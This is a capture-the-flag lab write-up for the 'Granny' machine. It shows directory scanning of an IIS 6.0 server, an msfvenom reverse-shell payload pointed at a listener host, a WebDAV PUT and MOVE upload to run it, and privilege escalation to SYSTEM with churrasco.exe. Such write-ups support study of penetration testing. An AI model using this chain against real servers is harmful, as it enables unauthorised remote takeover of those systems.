# Granny (easy/TJ Null)  

## Nmap  

Ports 0-15000.  

`80/tcp open  http    syn-ack Microsoft IIS httpd 6.0`  

## HTTP 80  

Scan with dirb.  

```
==> DIRECTORY: http://10.129.95.234/_private/                                  
==> DIRECTORY: http://10.129.95.234/_vti_bin/                                  
+ http://10.129.95.234/_vti_bin/_vti_adm/admin.dll (CODE:200|SIZE:195)         
+ http://10.129.95.234/_vti_bin/_vti_aut/author.dll (CODE:200|SIZE:195)        
+ http://10.129.95.234/_vti_bin/shtml.dll (CODE:200|SIZE:96)                   
==> DIRECTORY: http://10.129.95.234/_vti_log/                                  
==> DIRECTORY: http://10.129.95.234/aspnet_client/                             
==> DIRECTORY: http://10.129.95.234/images/                                    
==> DIRECTORY: http://10.129.95.234/Images/
```  

## Shell  

The IIS 6.0 is vulnerable to MS09-020.

Create shell.  

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=8888 -f aspx > met-shell.aspx`  

Copy file into a .txt file.  

`cp met-shell.aspx met-shell.txt`  

PUT file using curl.  

`curl -X PUT http://10.129.95.234/met-shell.txt --data-binary @met-shell.txt`

MOVE into aspx file, this can be accessed in the browser to return a shell to a listener.  

`curl -X MOVE -H 'Destination: http://10.129.95.234/met-shell.aspx' http://10.129.95.234/met-shell.txt`  

## Priv Esc  

The following was found for win server 2003, this abuses the system token. As certutil wouldn't work, I had to upload this binary and another rev shell the same way I got the initial shell.  

Binary downloaded from.  

`https://github.com/Re4son/Churrasco/raw/master/churrasco.exe`

`.\churrasco.exe -d "c:\Inetpub\wwwroot\root-shell.exe"`  

I received a SYSTEM shell back to my listener.
